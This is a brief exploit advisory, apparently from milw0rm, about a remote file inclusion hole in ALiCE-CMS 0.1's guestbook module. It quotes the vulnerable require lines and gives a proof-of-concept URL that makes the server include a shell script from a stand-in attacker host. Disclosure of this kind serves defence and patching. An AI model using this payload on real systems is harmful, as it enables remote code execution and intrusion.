@@ -1,0 +1,23 @@
++-------------------------------------------------------------------------------------------
++ ALiCE-CMS 0.1 (CONFIG[local_root]) Remote File Include Vulnerability
++-------------------------------------------------------------------------------------------
++ Affected Software .: ALiCE-CMS 0.1
++ Vendor ............: http://alicecms.sourceforge.net/
++ Description .......: "ALiCE is a content-management-system cms written in php4 with mysql database."
++ Class .............: Remote File Inclusion
++ Risk ..............: High (Remote File Execution)
++ Found By ..........: nuffsaid <nuffsaid[at]newbslove.us>
++-------------------------------------------------------------------------------------------
++ Details:
++ The $CONFIG['local_root'] variable in modules/guestbook/index.php is not set before being
++ used to include files.
++ 
++ Vulnerable Code:
++ modules/guestbook/index.php, line(s) 2: require $CONFIG['local_root'].'modules/guestbook/guestbook.class.php';
++ modules/guestbook/index.php, line(s) 3: require $CONFIG['local_root'].'modules/guestbook/guestbookfunctions.php';
++ 
++ Proof Of Concept:
++ http://[target]/[path]/modules/guestbook/index.php?CONFIG[local_root]=http://evilsite.com/shell.php?
++-------------------------------------------------------------------------------------------
+
+# milw0rm.com [2006-10-17]
